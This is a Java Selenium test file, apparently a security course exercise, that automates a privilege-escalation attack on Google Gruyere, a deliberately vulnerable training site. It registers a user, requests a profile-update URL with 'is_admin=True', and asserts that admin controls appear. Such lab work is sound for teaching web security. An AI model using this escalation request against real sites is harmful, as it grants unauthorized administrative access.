package org.example;

import java.time.Duration;
import java.util.List;
import java.util.Random;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

public class Question4 {
    private WebDriver driver;
    private WebDriverWait wait;

    private String url;

    @BeforeEach
    void setUp() {
        driver = new FirefoxDriver();
        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(3));
        wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        url = "http://google-gruyere.appspot.com/363905908632117481656375832475944051931";

    }

    @Test
    void testGruyere() {
        float random = new Random().nextFloat(10000);
        driver.get(url);
        driver.findElement(By.linkText("Sign up")).click();
        driver.findElement(By.name("uid")).sendKeys("toto"+random);
        driver.findElement(By.name("pw")).sendKeys("toto");
        driver.findElement(By.name("pw")).sendKeys(Keys.ENTER);
        driver.findElement(By.cssSelector("tr:nth-child(4) input")).click();
        {
            List<WebElement> elements = driver.findElements(By.cssSelector(".message"));
            assert(elements.size() > 0);
        }
        driver.findElement(By.linkText("Home")).click();
        driver.get(url+"/saveprofile?action=update&is_admin=True");
        driver.findElement(By.linkText("Sign out")).click();
        {
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(30));
            wait.until(ExpectedConditions.presenceOfElementLocated(By.linkText("Sign in")));
        }
        driver.get(url);
        driver.findElement(By.linkText("Sign in")).click();
        driver.findElement(By.name("uid")).sendKeys("toto"+random);
        driver.findElement(By.name("pw")).sendKeys("toto");
        driver.findElement(By.name("pw")).sendKeys(Keys.ENTER);

        WebElement link = driver.findElement(By.xpath("//a[contains(text(), 'Manage this server')]"));

        Assertions.assertEquals(link.getText(), "Manage this server");
    }

    @AfterEach
    void tearDown() {
        if (driver != null) {
            //driver.quit();
        }
    }
}
